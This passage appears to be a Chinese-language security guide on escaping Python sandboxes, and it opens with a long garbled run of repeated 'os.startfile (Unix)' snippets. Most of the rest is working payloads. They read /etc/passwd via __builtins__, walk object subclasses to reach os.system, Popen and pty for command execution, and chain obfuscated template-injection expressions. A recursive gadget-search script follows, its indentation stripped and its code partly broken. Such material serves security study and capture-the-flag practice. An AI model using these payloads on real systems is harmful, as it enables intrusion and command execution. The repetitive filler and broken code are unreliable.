os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('nnn file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('lf file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('noice file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('fman file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('doublecmd file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('worker file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('emelfm2 file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('gentoo file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox-filer file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('thunar file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('spacefm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('xfe file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('rox file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('pcmanfm file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('mc file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('ranger file.txt')
```

#### `os.startfile` (Unix)

```python
import os

os.system('vifm file.txt')
```

#### `os.startfile` (Unix)

```python
import os
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## 全局变量和局部变量

检查 **`globals`** 和 **`locals`** 是了解你可以访问的内容的好方法。
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**下面有一个更大的函数**](./#recursive-search-of-builtins-globals)可以找到数十/**数百个地方**，你可以在这些地方找到**全局变量**。

## 发现任意执行

在这里，我想解释一下如何轻松发现**加载了更危险功能**并提出更可靠的利用方法。

#### 通过绕过访问子类

这个技术最敏感的部分之一是能够**访问基类的子类**。在之前的例子中，使用了`''.__class__.__base__.__subclasses__()`，但还有**其他可能的方法**：
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### 查找已加载的危险库

例如，知道使用库**`sys`**可以**导入任意库**，您可以搜索所有已加载的**模块中是否导入了sys**：
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
有很多方法，**我们只需要一个**来执行命令：
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
我们可以使用**其他已知可用于执行命令的库**来执行相同的操作：
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
此外，我们甚至可以搜索加载恶意库的模块：
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
此外，如果您认为**其他库**可能能够**调用函数来执行命令**，我们还可以通过可能的库中的函数名称进行**过滤**：
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## 递归搜索内置函数、全局变量...

{% hint style="warning" %}
这个简直**太棒了**。如果你**想要查找像globals、builtins、open或其他任何对象**，只需使用这个脚本**递归地找到可以找到该对象的位置**。
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
